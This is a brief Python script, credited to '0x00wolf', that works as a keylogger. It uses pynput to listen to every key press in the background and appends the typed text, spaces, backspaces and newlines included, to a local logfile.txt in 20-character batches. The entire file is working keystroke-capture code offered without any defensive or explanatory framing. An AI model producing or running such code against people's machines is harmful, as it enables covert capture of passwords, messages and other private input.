# by 0x00wolf:
import queue
import threading
from pynput import keyboard


def worker():
    key_string = ''
    while True:
        key = q.get()
        try:
            key_string += str(key.char)
        except AttributeError:
            if key == key.space:
                key_string += ' '
            elif key == key.backspace:
                key_string = key_string[:-1]
            elif key == key.shift:
                pass
            elif key == key.enter:
                key_string += '\\n'
            elif key == key.alt:
                pass
            elif key == key.tab:
                pass
            elif key == key.ctrl:
                pass
            else:
                key_string += str(key)

        if len(key_string) >= 20:
            with open('logfile.txt', 'a') as f:
                f.write(key_string)
            key_string = ''

        q.task_done()


def on_press(key):
    q.put(key)


q = queue.Queue()  # 1) Create a Queue object
t = threading.Thread(target=worker)  # 2) Initialize the worker function in a separate Thread
t.start()  
listener = keyboard.Listener(on_press=on_press)  # 3) Initialize the Pynput Listener object
listener.start()
